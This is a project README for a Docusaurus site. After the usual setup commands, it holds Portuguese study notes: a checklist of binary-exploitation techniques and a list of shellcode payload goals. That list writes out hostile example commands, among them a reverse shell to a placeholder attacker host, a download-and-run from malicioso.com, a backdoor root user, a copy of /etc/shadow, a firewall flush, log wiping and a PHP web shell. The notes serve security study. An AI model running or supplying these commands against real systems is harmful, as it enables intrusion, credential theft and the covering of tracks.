# Website

This website is built using [Docusaurus](https://docusaurus.io/), a modern static website generator.

## New site

```bash
npm init docusaurus@latest my-website classic
```

This command generates a new site

## Local Development

```bash
npm run start
```

This command starts a local development server and opens up a browser window. Most changes are reflected live without having to restart the server.

## Build

```bash
npm run build
```

This command generates static content into the `build` directory and can be served using any static contents hosting service.

## Deployment

Using SSH:

```bash
USE_SSH=true npm run deploy
```

Not using SSH:

```bash
GIT_USER=<Your GitHub username> npm run deploy
```

If you are using GitHub pages for hosting, this command is a convenient way to build the website and push to the `gh-pages` branch.
(depois de alterar tudo do sidebars.js e criar a branch no repositório)

# Checklist

## Stack Buffer Overflows
- **Stack Buffer Overflows** - Explora escrita além dos limites de buffer na stack, permitindo sobrescrever variáveis e ponteiros de retorno ✅

## Format Strings
- **Format Strings** - Explora funções de formatação não validadas para leitura/escrita arbitrária de memória ✅

## Array Indexing
- **Array Indexing** - Usa índices não validados para acessar memória além dos limites do array ✅

## Bad Seed
- **Bad Seed** - Explora geração previsível de números aleatórios devido a seeds fracas ✅

## Integer Overflows
- **Integer Overflows** - Explora wraparound em operações aritméticas que excedem limites do tipo de dado ✅

## Z3 & Symbolic Execution
- **Z3 & Symbolic Execution** - Usa análise simbólica para modelar execução e resolver restrições automaticamente ✅

## Return Oriented Programming (ROP)
- **Return Oriented Programming** - Encadeia instruções existentes (gadgets) terminadas em ret para construir payloads ✅
  - **Partial Overwrite** - Modifica apenas parte de um endereço para contornar ASLR ✅
  - **Stack Pivoting** - Redireciona a stack para região de memória controlada pelo atacante ✅
  - **SIGROP (SROP)** - Explora sinais Unix usando estrutura sigcontext para controlar registradores ✅
  - **ret2csu** - Usa gadgets em __libc_csu_init para configurar múltiplos argumentos ✅
  - **ret2system** - Retorna para função system() com argumento controlado para obter shell ✅

## Heap Exploitation
- **Heap Exploitation** - Explora vulnerabilidades no gerenciador de memória dinâmica
  - **Double Frees** - Libera um chunk de memória duas vezes, corrompendo estruturas do heap
  - **Heap Consolidation** - Força fusão de chunks livres para criar chunks sobrescritíveis
  - **Use-after-Frees** - Usa ponteiro para memória já liberada com dados controlados
  - **Protostar** - Conjunto de desafios introdutórios de heap exploitation
  - **unlink() Exploitation** - Corrompe ponteiros em chunks livres durante operações unlink
  - **Heap Grooming** - Organiza layout do heap de forma previsível para facilitar explorações
  - **Fastbin Attack** - Corrompe listas de fastbins para alocar memória em endereços arbitrários
  - **Unsortedbin Attack** - Modifica ponteiros na lista unsorted bin para escrita arbitrária
  - **Largebin Attack** - Corrompe listas de largebins para obter escrita arbitrária ou vazamento
  - **glibc tcache** - Explora thread-local caching bins do glibc 2.26+
  - **House of Spirit** - Engana malloc para alocar chunk em região controlada (ex: stack)
  - **House of Lore** - Corrompe smallbins para alocar chunk em local arbitrário
  - **House of Force** - Sobrescreve top chunk para forçar malloc a retornar endereço arbitrário
  - **House of Einherjar** - Usa consolidação para fundir chunk falso com chunk livre existente
  - **House of Orange** - Explora syscall _int_free sem usar função free()

## FILE Exploitation
- **FILE Exploitation** - Explora estruturas FILE (_IO_FILE) e funções da libc para leitura/escrita arbitrária

## Grab Bag (Técnicas Diversas)
- **Grab Bag** - Técnicas diversas de exploração
  - **Shellcoding** - Cria código executável malicioso para execução direta na memória
  - **Patching** - Modifica binários para remover proteções ou alterar comportamento
  - **.NET** - Explora aplicações .NET através de deserialização insegura ou reflexão
  - **Obfuscation** - Dificulta análise reversa de exploits ou shellcodes
  - **Custom Architecture** - Explora binários para arquiteturas não convencionais
  - **Emulation** - Usa emuladores para análise dinâmica em ambientes controlados
  - **Uninitialized Variables** - Usa variáveis não inicializadas com dados residuais para vazar informações

# O que colocar no shellcode? 🎯

## 1. **Shell Reverso / Bind Shell**
- **O quê:** Conecta de volta ao atacante ou abre porta para conexão
- **Para que:** Acesso remoto ao sistema comprometido
- **Exemplo:** `/bin/sh -i >& /dev/tcp/ATACANTE/PORTA 0>&1`

## 2. **Download & Execute**
- **O quê:** Baixa arquivo da internet e executa
- **Para que:** Estágio secundário, atualizar payload
- **Exemplo:** `wget http://malicioso.com/payload; chmod +x payload; ./payload`

## 3. **Add User / Backdoor**
- **O quê:** Cria novo usuário com privilégios
- **Para que:** Acesso persistente mesmo se vulnerabilidade for corrigida
- **Exemplo:** `useradd -m -s /bin/bash -g root hacker; echo "hacker:senha123" | chpasswd`

## 4. **Privilege Escalation**
- **O quê:** Explora vulnerabilidade local para virar root/admin
- **Para que:** Ganhar controle total do sistema
- **Exemplo:** Explora CVE conhecido, abusa de sudo misconfigurado

## 5. **File Manipulation**
- **O quê:** Lê, escreve, exclui ou modifica arquivos
- **Para que:** Roubo de dados, destruição, instalação de backdoor
- **Exemplo:** `cat /etc/shadow > /tmp/roubado.txt` (rouba hashes de senha)

## 6. **Persistence Mechanism**
- **O quê:** Configura inicialização automática
- **Para que:** Sobreviver a reinicializações
- **Exemplo:** Adiciona entrada em crontab, .bashrc, systemd, registro do Windows

## 7. **Disable Security**
- **O quê:** Desliga firewall, antivírus, logging
- **Para que:** Facilitar atividades futuras
- **Exemplo:** `systemctl stop firewalld; iptables -F`

## 8. **Lateral Movement**
- **O quê:** Propaga para outras máquinas na rede
- **Para que:** Expandir controle na rede
- **Exemplo:** Usa credenciais roubadas para conectar a outros servidores

## 9. **Keylogger / Screenshot**
- **O quê:** Captura teclas digitadas ou tela
- **Para que:** Espionagem, roubo de credenciais
- **Exemplo:** Grava tudo que usuário digita e envia para atacante

## 10. **Cryptominer**
- **O quê:** Minera criptomoeda usando recursos da vítima
- **Para que:** Ganho financeiro direto
- **Exemplo:** Executa XMRig em segundo plano

## 11. **Ransomware Component**
- **O quê:** Criptografa arquivos da vítima
- **Para que:** Extorsão por resgate
- **Exemplo:** Percorre diretórios criptografando .jpg, .doc, .pdf

## 12. **Info Stealer**
- **O quê:** Coleta informações sensíveis
- **Para que:** Roubo de dados, intelligence
- **Exemplo:** Procura por arquivos com "senha", "password", "credential"

## 13. **Cleanup / Anti-Forensics**
- **O quê:** Apaga logs, esconde rastros
- **Para que:** Dificultar investigação
- **Exemplo:** `rm -rf /var/log/*; history -c`

## 14. **Meterpreter / C2 Agent**
- **O quê:** Conecta a servidor de comando e controle
- **Para que:** Controle remoto avançado
- **Exemplo:** Payload do Metasploit que permite mais de 100 comandos

## 15. **Web Shell**
- **O quê:** Script PHP/ASP que executa comandos via web
- **Para que:** Acesso através de navegador
- **Exemplo:** `<?php system($_GET['cmd']); ?>` em servidor web comprometido

---

**Dica:** Shellcode é como uma **caixa de ferramentas** - escolha as ferramentas certas para o trabalho. Muitos ataques começam simples (shell reverso) e depois expandem funcionalidades. 🔧